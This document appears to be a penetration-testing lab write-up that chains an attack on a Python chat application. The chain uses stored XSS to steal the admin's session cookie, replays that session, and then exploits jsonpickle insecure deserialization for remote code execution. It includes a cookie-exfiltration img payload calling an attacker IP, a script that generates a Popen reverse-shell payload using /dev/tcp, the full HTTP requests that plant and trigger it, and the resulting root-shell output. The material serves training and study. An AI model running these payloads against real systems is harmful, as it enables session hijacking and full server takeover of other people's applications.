# Chat Application XSS and `jsonpickle` Insecure Deserialization RCE 
Chat Application is a Python-based program that uses PostgreSQL as its database management system and runs on Linux. In this application, you can create an account, then create chat groups with friends, or join existing ones.

Docs available: http://chat:8000/docs
## Authentication Bypass — XSS
This application uses WebSocket to send messages in the chat system; however, it does not sanitize user input, which can lead to XSS attacks in the victim's browser.

To develop a useful exploit, we will use XSS to hijack the admin's session cookie and log in as the admin.

*Note: Using the browser’s `Developer Tools`, we can easily see that the `token` session cookie does not have the `HttpOnly` flag set. This means a successful XSS attack would allow full hijacking of the admin’s session.*

First, we need to join a chat with the admin. This can be done by creating an account, then using the **`Join the Group`** option and entering the admin’s username (`admin`). Now we can start chatting with the admin.

When joined, we will use this XSS payload to exfiltrate the admin's session cookie and send it to our server:
```html
<img src=x onerror="new Image().src='http://192.168.45.161/token?'+document.cookie">
```
Then check our python server:
```bash
──(kali㉿kali)-[~]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.131.243 - - [13/Aug/2025 11:11:06] "GET /token?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoibWVtYmVyIiwiZXhwIjoxNzU3NzQ4Nzg1fQ.350q8VaT4W8vtuKFO7XyTrChKiXsQcEfp6LAQ72Y8vw;%20username=admin;%20group=13;%20group_name=Public%20Discussion HTTP/1.1" 404 -

```
### Session Riding
Now, if we use the captured session to replace the existing `token` value in our browser via `Developer Tools` → `Storage` → `Cookies`, and also change the `username` to `admin`, we will see that we are now logged in as the admin account.

## Remote Code Execution — Insecure Deserialization
After hijacking the admin’s session, we observe that a `Preferences` function has appeared. When used, it sends a `POST` request to `/api/update-preferences?user_id=10`.

```text
POST /api/update-preferences?user_id=10 HTTP/1.1
Host: 192.168.131.243:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoibWVtYmVyIiwiZXhwIjoxNzU3NzQ4Nzg1fQ.350q8VaT4W8vtuKFO7XyTrChKiXsQcEfp6LAQ72Y8vw
Content-Length: 132
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoibWVtYmVyIiwiZXhwIjoxNzU3NzQ4Nzg1fQ.350q8VaT4W8vtuKFO7XyTrChKiXsQcEfp6LAQ72Y8vw; username=admin; group=13; group_name=Public Discussion


{"email_notifications":"1","sms_notifications":"1","notification_frequency":"immediate","profile_visibility":"1","data_sharing":"1"}
```
Inspecting the response, we can see the message `"Preferences Successfully Updated!"` in the response body.
```text
HTTP/1.1 200 OK
date: Wed, 13 Aug 2025 21:37:17 GMT
server: uvicorn
content-length: 35
content-type: application/json
access-control-allow-origin: http://192.168.131.243:8000
access-control-allow-credentials: true
vary: Origin

"Preferences Successfully Updated!"
```
### Source Code Analysis
Using the string `"Preferences Successfully Updated!"`, we can search for it in the codebase to locate the function’s implementation.

We found one result at `chat/views/user.py`

```python
...
@app.post("/api/update-preferences", tags=["User"])
async def update_user_preferences(
    request: Request,
    user_id: int,
    preferences: UserPreferences,
    current_user: User = Depends(get_current_active_user_admin),
    db: Session = Depends(get_db)
):

    raw_body = await request.body()
    json_body = json.loads(raw_body)
    print(json_body)
    if current_user == "admin":
        updated_preferences = await save_user_preferences_controller(db, user_id, json_body)

        if updated_preferences is None:
            raise HTTPException(
                status_code=400, detail="Failed to update preferences.")

        return "Preferences Successfully Updated!"
    else:
        return {
            "message": "Access Denied. Only Administrators can access this API.",
        }
...
```
As we can see, this endpoint lets an admin update a user’s preferences.
Even though it declares a `preferences: UserPreferences` parameter, it ignores FastAPI’s automatic parsing and instead manually reads the raw request body, converts it to JSON, and prints it. If the current user is `"admin"`, it sends that parsed JSON to `save_user_preferences_controller` to store in the database; otherwise, it returns an access denied message.

Let's follow the function `save_user_preferences_controller` definition be pressing the `CTRL` and the function name in the same time.
```python
from sqlalchemy.orm import Session
from base64 import b64encode, b64decode
from chat import models, schema
from chat.utils.jwt import get_password_hash

from sqlalchemy.orm import Session
import pickle
import jsonpickle
import json


async def save_user_preferences_controller(
    db: Session,
    user_id: int,
    preferences: schema.UserPreferences
) -> models.UserPreferences | None:

    serialized_preferences = json.dumps(preferences).encode('utf-8')
    # Check if preferences already exist for the user
    existing_preferences = (
        db.query(models.UserPreferences)
        .filter(models.UserPreferences.user_id == user_id)
        .first()
    )
    if existing_preferences:
        # Update existing preferences with serialized data
        existing_preferences.preferences_data = serialized_preferences
        db.commit()
        db.refresh(existing_preferences)
        return existing_preferences
    else:
        # Create new preferences
        new_preferences = models.UserPreferences(
            user_id=user_id,
            preferences_data=serialized_preferences
        )
        db.add(new_preferences)
        db.commit()
        db.refresh(new_preferences)
        return new_preferences


def fetch_user_preferences(db: Session, user_id: int) -> schema.UserPreferences | None:
    existing_preferences = (
        db.query(models.UserPreferences)
        .filter(models.UserPreferences.user_id == user_id)
        .first()
    )

    if existing_preferences:
        # Deserialize preferences
        print(existing_preferences.preferences_data)
        # Step 1: Decode bytes to string
        data_string = existing_preferences.preferences_data.decode('utf-8')

        preferences_data = jsonpickle.decode(
            data_string)
        return schema.UserPreferences(**preferences_data)
    return None


```
This code saves and retrieves user preferences in a database by serializing them to JSON when storing and deserializing them when reading.

When saving, `save_user_preferences_controller` takes the `preferences` object, converts it to a JSON string with `json.dumps`, then encodes it to UTF-8 bytes before storing it in the `preferences_data` column. If the user already has preferences, it updates them; otherwise, it creates a new record.

When fetching, `fetch_user_preferences` reads the stored `preferences_data` bytes, decodes them back to a UTF-8 string, then uses `jsonpickle.decode` to reconstruct the original data structure, which is finally wrapped into a `schema.UserPreferences` Pydantic model.

### `jsonpickle` Insecure Deserialization
In this code, `jsonpickle.decode` is being called directly on untrusted data from the database without validation or sanitization.

If an attacker can insert arbitrary JSON data into the `preferences_data` column (for example, by calling an API that saves preferences), they could craft a payload that tells `jsonpickle` to restore a specific Python class and run code when it’s reconstructed. Since the application runs `jsonpickle.decode()` on that data without checking what it contains, it will blindly instantiate whatever object the payload describes.

That means the attacker could cause the server to load unexpected objects, call dangerous functions, or trigger side effects during deserialization — all without needing direct code execution beforehand.

Reference: [Remote Code Execution - Insecure Deserialization](https://secure-cookie.io/attacks/insecuredeserialization/#show-me-the-attackers-exploit)

### `jsonpickle` Insecure Deserialization Exploitaion 
As mentioned before, If an attacker can insert arbitrary JSON data into the `preferences_data` column (for example, by calling an API that saves preferences), they could craft a payload that tells `jsonpickle` to restore a specific Python class and run code when it’s reconstructed. Since the application runs `jsonpickle.decode()` on that data without checking what it contains, it will blindly instantiate whatever object the payload describes.

We will use this script to generate the malicious serialized object that gives us reverse shell:
```python
import jsonpickle

class Malicious:
    def __reduce__(self):
        from subprocess import Popen
        # Equivalent to:
        # bash -c "bash -i >& /dev/tcp/192.168.45.161/1337 0>&1"
        return Popen, (("bash", "-c", "bash -i >& /dev/tcp/192.168.45.161/1337 0>&1"),)

exploit = Malicious()
serialised = jsonpickle.encode(exploit)
print(serialised)

```
Output:
```json
{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["bash", "-c", "bash -i >& /dev/tcp/192.168.45.161/1337 0>&1"]}]}]}
```

python deserialization attacks payloads generator (another way to generate the malicious serialized payload): [Peas](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) 

#### Remote Code Execution
So, let's save our malicious serialized object into the database by sending this request:
```text
POST /api/update-preferences?user_id=10 HTTP/1.1
Host: 192.168.131.243:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Content-Type: application/json

Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoibWVtYmVyIiwiZXhwIjoxNzU3NzQ4Nzg1fQ.350q8VaT4W8vtuKFO7XyTrChKiXsQcEfp6LAQ72Y8vw
Content-Length: 269
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoibWVtYmVyIiwiZXhwIjoxNzU3NzQ4Nzg1fQ.350q8VaT4W8vtuKFO7XyTrChKiXsQcEfp6LAQ72Y8vw; username=admin; group=13; group_name=Public Discussion


{
  "py/reduce": [
    {"py/type": "subprocess.Popen"},
    {
      "py/tuple": [
        {
          "py/tuple": [
            "bash",
            "-c",
            "bash -i >& /dev/tcp/192.168.45.161/1337 0>&1"
          ]
        }
      ]
    }
  ]
}
```
With our Netcat listener setup, lets call the endpoint that retrieves the `preferences_data` from the database to trigger the deserialization function on it by sending this request:
```text
GET /api/get-preferences?user_id=10 HTTP/1.1
Host: 192.168.131.243:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoibWVtYmVyIiwiZXhwIjoxNzU3NzQ4Nzg1fQ.350q8VaT4W8vtuKFO7XyTrChKiXsQcEfp6LAQ72Y8vw
Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTAsInVzZXJuYW1lIjoiYWRtaW4iLCJyb2xlIjoibWVtYmVyIiwiZXhwIjoxNzU3NzQ4Nzg1fQ.350q8VaT4W8vtuKFO7XyTrChKiXsQcEfp6LAQ72Y8vw; username=admin; group=13; group_name=Public Discussion


```
Now lets check our listener:
```bash
┌──(kali㉿kali)-[~]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [192.168.45.161] from (UNKNOWN) [192.168.131.243] 39780
bash: cannot set terminal process group (726): Inappropriate ioctl for device
bash: no job control in this shell
root@lab-awae-243-ubuntu2204-chat-target-249-081:/home/student/chat_app# 
```
